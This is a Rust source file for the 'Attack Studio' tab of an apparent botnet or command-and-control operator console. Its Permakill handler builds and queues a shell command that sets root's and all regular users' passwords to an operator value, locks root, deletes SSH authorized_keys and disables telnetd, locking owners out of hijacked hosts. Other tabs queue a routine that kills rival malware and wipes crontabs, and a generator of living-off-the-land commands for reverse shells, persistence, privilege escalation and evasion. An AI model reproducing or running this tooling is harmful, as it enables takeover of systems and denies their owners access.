//! Tab F4: Attack Studio — Permakill, SerialKiller, LOLBin command generation.

use crate::api::ApiClient;
use crate::ui;
use crossterm::event::KeyCode;
use ratatui::layout::{Constraint, Direction, Layout, Rect};
use ratatui::style::{Color, Style};
use ratatui::text::Line;
use ratatui::widgets::{Block, Borders, Paragraph};
use ratatui::Frame;

use arcticfox_lol::{LolCategory, LolBin, TargetOs, find_by_category};

#[derive(Default)]
pub struct AttackTabState {
    pub sub_tab: usize,
    pub selected: usize,

    pub pk_user: String,
    pub pk_pass: String,
    pub pk_user_mode: bool,

    pub sk_aggressive: bool,

    pub lol_category: usize,
    pub lol_os: usize,
    pub lol_binary_idx: usize,
    pub lol_payload: String,
    pub lol_result: String,
    pub lol_entries: Vec<&'static LolBin>,

    pub preview: String,
}

static CATEGORY_VARIANTS: &[LolCategory] = &[
    LolCategory::Execute, LolCategory::Download, LolCategory::ReverseShell,
    LolCategory::Persist, LolCategory::PrivEsc, LolCategory::Evasion,
    LolCategory::FileRead, LolCategory::FileWrite,
];

static CATEGORY_NAMES: &[&str] = &[
    "Execute", "Download", "ReverseShell", "Persist", "PrivEsc",
    "Evasion", "FileRead", "FileWrite",
];

static OS_VARIANTS: &[TargetOs] = &[TargetOs::Linux, TargetOs::Windows, TargetOs::MacOs];
static OS_NAMES: &[&str] = &["linux", "windows", "macos"];

fn load_lol_entries(state: &mut AttackTabState) {
    let cat = &CATEGORY_VARIANTS[state.lol_category];
    let os = &OS_VARIANTS[state.lol_os];
    state.lol_entries = find_by_category(*cat, *os);
    state.lol_binary_idx = 0;
}

pub fn render(f: &mut Frame, area: Rect, state: &mut AttackTabState) {
    let sub_chunks = Layout::default()
        .direction(Direction::Vertical)
        .constraints([Constraint::Length(3), Constraint::Min(0)])
        .split(area);

    let sub_titles: Vec<Line> = ["Permakill", "SerialKiller", "LOLBin"].iter().enumerate().map(|(i, name)| {
        let style = if i == state.sub_tab { Style::default().fg(Color::Black).bg(Color::Cyan) } else { Style::default().fg(Color::Gray) };
        Line::from(ratatui::text::Span::styled(format!(" {name} "), style))
    }).collect();

    let tabs_widget = ratatui::widgets::Tabs::new(sub_titles)
        .block(Block::default().borders(Borders::NONE))
        .highlight_style(Style::default().fg(Color::Cyan));
    f.render_widget(tabs_widget, sub_chunks[0]);

    let content_area = ui::centered_rect(95, 90, sub_chunks[1]);

    match state.sub_tab {
        0 => render_permakill(f, content_area, state),
        1 => render_serial_killer(f, content_area, state),
        _ => render_lolbin(f, content_area, state),
    }
}

fn render_permakill(f: &mut Frame, area: Rect, state: &AttackTabState) {
    let chunks = Layout::default().direction(Direction::Vertical).constraints([Constraint::Length(10), Constraint::Min(0)]).split(area);

    let username_display = if state.pk_user_mode { state.pk_user.as_str() } else { "[press u to set]" };
    let pass_display = if state.pk_user_mode { state.pk_pass.as_str() } else { "[press p to set]" };

    let lines = vec![
        Line::from(format!("  Username: {username_display}")),
        Line::from(format!("  Password: {pass_display}")),
        Line::from(""),
        Line::from("  [Enter] Generate & Queue   [v] Preview Script"),
    ];
    f.render_widget(Paragraph::new(lines).block(ui::block_border(" PERMAKILL ")), chunks[0]);
    if !state.preview.is_empty() { f.render_widget(Paragraph::new(state.preview.as_str()).block(ui::block_plain(" Preview ")), chunks[1]); }
}

fn render_serial_killer(f: &mut Frame, area: Rect, state: &AttackTabState) {
    let chunks = Layout::default().direction(Direction::Vertical).constraints([Constraint::Length(8), Constraint::Min(0)]).split(area);

    let lines = vec![
        Line::from(format!("  Mode: {}", if state.sk_aggressive { "Aggressive" } else { "Conservative" })),
        Line::from("  Target: 50 malware families + 13 ports"),
        Line::from(""),
        Line::from("  [Space] Toggle mode   [Enter] Generate   [v] Preview"),
    ];
    f.render_widget(Paragraph::new(lines).block(ui::block_border(" SERIALKILLER ")), chunks[0]);
    if !state.preview.is_empty() { f.render_widget(Paragraph::new(state.preview.as_str()).block(ui::block_plain(" Preview ")), chunks[1]); }
}

fn render_lolbin(f: &mut Frame, area: Rect, state: &AttackTabState) {
    let chunks = Layout::default().direction(Direction::Vertical).constraints([Constraint::Length(9), Constraint::Length(2), Constraint::Min(0)]).split(area);

    let binary_name = state.lol_entries.get(state.lol_binary_idx).map(|e| e.binary.as_str()).unwrap_or("(none)");

    let lines = vec![
        Line::from(format!("  Category: {}    OS: {}    Binary: {}", 
            CATEGORY_NAMES[state.lol_category], OS_NAMES[state.lol_os], binary_name)),
        Line::from(format!("  Payload:  {}", state.lol_payload)),
        Line::from(""),
        Line::from("  [← →] Category   [↑ ↓] OS   [Tab] Binary   [Enter] Generate   [c] Copy   [q] Queue"),
    ];
    f.render_widget(Paragraph::new(lines).block(ui::block_border(" LOLBIN STUDIO ")), chunks[0]);

    if !state.lol_result.is_empty() {
        f.render_widget(Paragraph::new(state.lol_result.as_str()).block(ui::block_plain(" Generated ")).style(Style::default().fg(Color::Green)), chunks[1]);
    }
}

pub async fn handle_key(key: KeyCode, state: &mut AttackTabState, api: &ApiClient, status: &mut String) {
    match key {
        KeyCode::Char('1') => state.sub_tab = 0,
        KeyCode::Char('2') => state.sub_tab = 1,
        KeyCode::Char('3') => state.sub_tab = 2,
        _ => {}
    }

    if state.lol_entries.is_empty() && state.sub_tab == 2 { load_lol_entries(state); }

    match state.sub_tab {
        0 => {
            match key {
                KeyCode::Char('u') => state.pk_user_mode = true,
                KeyCode::Char('p') => { state.pk_user_mode = true; }
                KeyCode::Enter => {
                    if state.pk_pass.is_empty() { *status = "Set password first (press p)".into(); return; }
                    let cmd = format!("cmd chpasswd <<< 'root:{}' && for u in $(awk -F: '\\$3>=1000{{print \\$1}}' /etc/passwd); do echo \"${{u}}:{}\" | chpasswd; done && passwd -l root && rm -rf /root/.ssh/authorized_keys /home/*/.ssh/authorized_keys && systemctl disable telnetd", state.pk_pass, state.pk_pass);
                    match api.add_command(&cmd).await { Ok(_) => *status = "Permakill queued.".into(), Err(e) => *status = format!("Error: {e}") }
                }
                KeyCode::Char('v') => { state.preview = format!("Permakill — changes all passwords to: {}", state.pk_pass); }
                _ => {
                    if state.pk_user_mode {
                        match key { KeyCode::Char(c) => state.pk_user.push(c), KeyCode::Backspace => { state.pk_user.pop(); }, KeyCode::Esc => { state.pk_user_mode = false; }, _ => {} }
                    }
                }
            }
        }
        1 => {
            match key {
                KeyCode::Char(' ') => { state.sk_aggressive = !state.sk_aggressive; }
                KeyCode::Enter => {
                    let cmd = if state.sk_aggressive { "serialkiller RUN" } else { "serialkiller" };
                    match api.add_command(cmd).await { Ok(_) => *status = "SerialKiller queued.".into(), Err(e) => *status = format!("Error: {e}") }
                }
                KeyCode::Char('v') => { state.preview = if state.sk_aggressive { "Aggressive: killall+pkill 50 families + iptables 13 ports + wipe crontabs/tmp".into() } else { "Conservative: killall+pkill 50 families + iptables 13 ports".into() }; }
                _ => {}
            }
        }
        _ => {
            match key {
                KeyCode::Left => { state.lol_category = (state.lol_category + CATEGORY_VARIANTS.len() - 1) % CATEGORY_VARIANTS.len(); load_lol_entries(state); }
                KeyCode::Right => { state.lol_category = (state.lol_category + 1) % CATEGORY_VARIANTS.len(); load_lol_entries(state); }
                KeyCode::Up => { state.lol_os = (state.lol_os + OS_VARIANTS.len() - 1) % OS_VARIANTS.len(); load_lol_entries(state); }
                KeyCode::Down => { state.lol_os = (state.lol_os + 1) % OS_VARIANTS.len(); load_lol_entries(state); }
                KeyCode::Tab => if !state.lol_entries.is_empty() { state.lol_binary_idx = (state.lol_binary_idx + 1) % state.lol_entries.len(); }
                KeyCode::Enter => {
                    if let Some(entry) = state.lol_entries.get(state.lol_binary_idx) {
                        let payload = if state.lol_payload.is_empty() { None } else { Some(state.lol_payload.as_str()) };
                        let result = entry.generate(payload, None, None, None, None);
                        state.lol_result = result.unwrap_or_else(|e| format!("Error: {e}"));
                    }
                }
                KeyCode::Char('c') => if !state.lol_result.is_empty() { *status = "Command ready.".into(); }
                KeyCode::Char('q') => {
                    if !state.lol_result.is_empty() {
                        let cmd = format!("cmd {}", state.lol_result);
                        match api.add_command(&cmd).await { Ok(_) => *status = "Queued.".into(), Err(e) => *status = format!("Error: {e}") }
                    }
                }
                _ => {}
            }
        }
    }
}
